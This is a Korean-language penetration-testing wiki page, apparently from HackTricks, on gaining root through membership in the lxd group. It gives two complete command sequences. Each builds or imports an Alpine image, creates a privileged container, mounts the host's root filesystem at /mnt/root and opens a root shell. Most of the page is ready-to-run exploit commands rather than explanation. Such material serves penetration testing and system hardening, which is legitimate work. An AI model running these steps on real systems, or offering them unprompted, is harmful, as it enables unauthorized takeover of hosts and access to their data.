# lxd/lxc Group - 권한 상승

{{#include ../../../banners/hacktricks-training.md}}

호스트의 LXD management group(일반적으로 _**lxd**_)에 속해 있으면 daemon을 완전히 제어할 수 있으므로 root 권한을 얻을 수 있습니다.<sup>[[1]](#references)</sup>

## 인터넷 없이 Exploiting

### Method 1

신뢰할 수 있는 repository에서 LXD와 함께 사용할 Alpine image를 다운로드할 수 있습니다.  
Canonical의 LXD image server는 daily build를 게시합니다: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
최신 build에서 **lxd.tar.xz**와 **rootfs.squashfs**를 모두 다운로드하면 됩니다(디렉터리 이름은 날짜입니다).<sup>[[8]](#references)</sup>

또는 [project instructions](https://github.com/lxc/distrobuilder)를 따라 자신의 머신에 distrobuilder를 설치할 수 있습니다.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
**incus.tar.xz** (**Canonical image server에서 다운로드한 경우에는 lxd.tar.xz**)와 **rootfs.squashfs**를 업로드한 다음, image를 import하고 container를 생성합니다.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> 이 오류 _**Error: No storage pool found. Please create a new storage pool**_가 발생하면\
> **`lxd init`**을 실행하고 기본 storage pool을 설정한 다음, 이전 명령어 묶음을 **반복**하세요.<sup>[[2]](#references)</sup>

마지막으로 container를 시작하고 host filesystem에서 root shell을 여세요:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 방법 2

`security.privileged=true` 플래그를 사용해 Alpine image를 빌드하고 시작하면 container root가 host root에 매핑되며, `/`를 mount할 경우 container 내부에서 host filesystem이 노출됩니다.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [LXD 보안을 강화하는 방법](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD containers 및 virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [images를 복사하고 import하는 방법](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [distrobuilder로 images를 build하는 방법](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
